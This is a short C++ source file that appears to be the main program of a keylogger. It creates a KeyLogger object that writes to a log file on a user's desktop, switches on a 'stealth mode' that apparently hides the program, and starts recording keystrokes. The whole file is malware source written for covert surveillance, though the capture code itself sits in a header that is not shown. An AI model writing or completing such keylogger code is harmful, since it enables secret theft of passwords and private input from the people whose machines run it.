#include "KeyLogger.h"

int main()
{
	KeyLogger Logger( R"(C:\Users\Narcis\Desktop\log.txt)" );

	if (!Logger.StartStealthMode())
		return 0;

	Logger.StartLogging();

	return 0;
}